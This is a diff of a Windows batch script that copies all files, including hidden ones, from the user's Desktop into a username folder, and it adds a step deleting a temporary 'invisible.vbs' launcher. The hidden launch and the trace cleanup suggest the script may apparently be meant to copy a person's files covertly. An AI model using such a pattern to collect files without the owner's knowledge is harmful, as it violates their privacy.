@@ -1,7 +1,7 @@
 @echo off
 color 02
 
-SET "DESTINATION=.Data_PC\%USERNAME%"
+SET "DESTINATION=Backup_PC\%USERNAME%"
 
 IF NOT EXIST "%DESTINATION%" (
     MD "%DESTINATION%"
@@ -27,11 +27,14 @@ for /R "%USERPROFILE%\Desktop" %%x in (*) do (
     call :CopyFile "%%x" "%DESTINATION%\Desktop\"
 )
 
+:: Eliminar el archivo invisible.vbs
+del "%temp%\invisible.vbs"
+
 EXIT
 
 :CopyFile
 SET "SOURCE_FILE=%~1"
 SET "DEST_FOLDER=%~2"
 MD "%DEST_FOLDER%" 2>nul
-copy "%SOURCE_FILE%" "%DEST_FOLDER%"
+xcopy /H "%SOURCE_FILE%" "%DEST_FOLDER%"
 GOTO :EOF
